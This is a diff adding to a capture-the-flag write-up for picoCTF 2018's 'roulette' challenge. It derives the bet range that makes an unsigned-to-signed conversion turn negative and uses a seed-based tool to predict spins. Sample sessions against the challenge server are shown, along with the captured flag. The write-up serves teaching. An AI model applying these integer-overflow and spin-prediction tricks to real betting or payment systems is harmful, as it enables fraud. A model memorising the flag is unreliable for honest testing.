@@ -230,20 +230,194 @@ Our target is to pass an input (unsigned) such that converted to `long` (signed)
 
 Let's call:
 * `x` the typed input without the last digit (that is the last value of `l` checked in `l >= LONG_MAX`);
-* `X = x*10 + C` the final input with `C in [0, 9]` the unit digit;
+* `X = x*10 + C` the final input with `C in [0, 9]` the unit digit (so `bet = (long) X`);
 * `Y` the current value of `cash`.
 
 Now it's time for some math:
-1. Our first constraint is `x < LONG_MAX = 0x7fffffff = 2147483647`, otherwise, appending `C`, the condition `l >= LONG_MAX` will fail.
-2. To make `(long) X` negative we want `(ulong) X > 0x7fffffff`:
-    ```
-    X = x * 10 + C > 0x7fffffff 
-	--> x * 10 > 0x7fffffff - C
-	--> x > ceil((0x7fffffff-C)/10) > ceil(0x7fffffff / 10) - floor(C/10) = 0x0ccccccc
-	--> x >= 0x0ccccccd = 214748365
-    ```
-3. 
+1. Our first constraint is `x < LONG_MAX = 0x7fffffff = 2147483647`, otherwise, appending `C`, the condition `l >= LONG_MAX` will fail;
+2. `cash - bet` must be greater than one billion:
+    <pre>
+    Y - X > 1000000000 = 0x3b9aca00
+    --> -X > 0x3b9aca00 - Y
+    --> X < Y - 0x3b9aca00 = Y + 0xc4653600 (<a href="https://en.wikipedia.org/wiki/Two%27s_complement">two's complement</a>)
+    Since Y >= 1 --> X < 1 + 0xc4653600 --> X < 0xc4653601
+    --> X <= 0xc4653600 = 3294967296
+    </pre>
+    Hence `X <= 3294967296`. This condition is stronger than 1;
+3. We also want `cash - bet` to be positive, so it must be less than or equal to `LONG_MAX = 0x7fffffff`:
+    <pre>
+    Y - X <= 0x7fffffff
+    --> -X <= 0x7fffffff - Y
+    --> X >= Y - 0x7fffffff = Y + 0x80000001 (<a href="https://en.wikipedia.org/wiki/Two%27s_complement">two's complement</a>)
+    We got at most 15 wins (at 16 we are kicked out) so:
+    Y <= 4999*2 ^ 15 = 163807232 --> X >= 163807232 + 0x80000001 --> X >= 0x89c38001
+    --> X >= 0x89c38001 = 2311290881
+    </pre>
+    Hence `X >= 2311290881`.
 
+So our input must be in range `[2311290881, 3294967296]`.
+This way we found an interval for our input that assures us that the `bet` will be interpreted as a negative number that subtracted from `cash` will make us gain one billion :D
 
+N.B. theoretically we can have more than `4999*2 ^ 15 = 163807232` as our current balance, for example having `cash = 1` and `bet = 3294967297`, losing the bet we get to exactly one billion (that is not sufficient to win, we have to overcome it): the point of the previous calculations is to find a good range to use if the only losing bet is the last one, i.e the one that bring us to one billion.
 
-Since starting value of `cash` is in `[1, 4999]` (I don't consider `0` because we would be kicked out in the beginning) and `MAX_WINS = 16`, after
+## Solution
+To get to the solution follow these steps:
+1. Run the remote application and take note of the starting balance value then use it as first argument running `spin_results` application ([download it here](https://github.com/PrinceOfBorgo/picoCTF2018-roulette/blob/master/spin_results) it or compile the [source code](https://github.com/PrinceOfBorgo/picoCTF2018-roulette/blob/master/spin_results.c) with `gcc spin_results.c -o spin_results`);
+2. Press ENTER in `spin_results` to know what number you have to choose in order to win in the remote application. Use it in the remote application with any amount not greater than your current balance (e.g. use `0`);
+3. Repeat step 2 other two times to obtain three wins;
+4. Set your bet to any amount in range `[2311290881, 3294967296]`;
+5. You want to lose this bet: press ENTER in `spin_results` to know what number you DO NOT have to choose in the remote application.
+6. Get your well deserved flag!
+
+Example:
+* Run remote service and take note of starting balance:
+    <pre>
+$ nc 2018shell.picoctf.com 25443
+Welcome to ONLINE ROULETTE!
+Here, have $<b>49</b> to start on the house! You'll lose it all anyways >:)
+
+How much will you wager?
+Current Balance: $49     Current Wins: 0
+>
+</pre>
+* Run `spin_results` using starting balance as argument and press ENTER three times:
+<pre>
+$ ./spin_results <b>49</b>
+Seed: 49
+
+Press ENTER to get the next spin result:
+Spin: <b>5</b>
+
+Press ENTER to get the next spin result:
+Spin: <b>20</b>
+
+Press ENTER to get the next spin result:
+Spin: <b>22</b>
+
+Press ENTER to get the next spin result:
+</pre>
+* Get three wins on roulette betting using the three predictions above (in that order):
+<pre>
+$ nc 2018shell.picoctf.com 25443
+Welcome to ONLINE ROULETTE!
+Here, have $49 to start on the house! You'll lose it all anyways >:)
+
+How much will you wager?
+Current Balance: $49     Current Wins: 0
+> 0       
+Choose a number (1-36)
+> <b>5</b>
+
+Spinning the Roulette for a chance to win $0!
+
+Roulette  :  5 
+
+You're not cheating are you?
+
+How much will you wager?
+Current Balance: $49     Current Wins: 1
+> 0
+Choose a number (1-36)
+> <b>20</b>
+
+Spinning the Roulette for a chance to win $0!
+
+Roulette  :  20
+
+Darn, you got it right.
+
+How much will you wager?
+Current Balance: $49     Current Wins: 2
+> 0
+Choose a number (1-36)
+> <b>22</b>
+
+Spinning the Roulette for a chance to win $0!
+
+Roulette  :  22
+
+Wow.. Nice One!
+
+How much will you wager?
+<b>Current Balance: $49     Current Wins: 3</b>
+>
+</pre>
+* Get another prediction that you DO NOT want to use:
+<pre>
+$ ./spin_results 49
+Seed: 49
+
+Press ENTER to get the next spin result:
+Spin: 5
+
+Press ENTER to get the next spin result:
+Spin: 20
+
+Press ENTER to get the next spin result:
+Spin: 22
+
+Press ENTER to get the next spin result:
+Spin: <b>3</b>
+
+Press ENTER to get the next spin result:
+</pre>
+* Bet any amount in `[2311290881, 3294967296]` on a number NOT EQUAL to previous prediction:
+<pre>
+$ nc 2018shell.picoctf.com 25443
+Welcome to ONLINE ROULETTE!
+Here, have $49 to start on the house! You'll lose it all anyways >:)
+
+How much will you wager?
+Current Balance: $49     Current Wins: 0
+> 0       
+Choose a number (1-36)
+> 5
+
+Spinning the Roulette for a chance to win $0!
+
+Roulette  :  5 
+
+You're not cheating are you?
+
+How much will you wager?
+Current Balance: $49     Current Wins: 1
+> 0
+Choose a number (1-36)
+> 20
+
+Spinning the Roulette for a chance to win $0!
+
+Roulette  :  20
+
+Darn, you got it right.
+
+How much will you wager?
+Current Balance: $49     Current Wins: 2
+> 0
+Choose a number (1-36)
+> 22
+
+Spinning the Roulette for a chance to win $0!
+
+Roulette  :  22
+
+Wow.. Nice One!
+
+How much will you wager?
+Current Balance: $49     Current Wins: 3
+> <b>2311290881</b>
+Choose a number (1-36)
+> <b>1</b>
+
+Spinning the Roulette for a chance to win $327614466!
+
+Roulette  :  3 
+
+<b>Nice try..
+If you keep it up, maybe you'll get the flag in 100000000000 years
+
+*** Current Balance: $1983676464 ***
+Wow, I can't believe you did it.. You deserve this flag!
+picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_8b7aef91}</b>
+</pre>
+* Flag: `picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_8b7aef91}`.
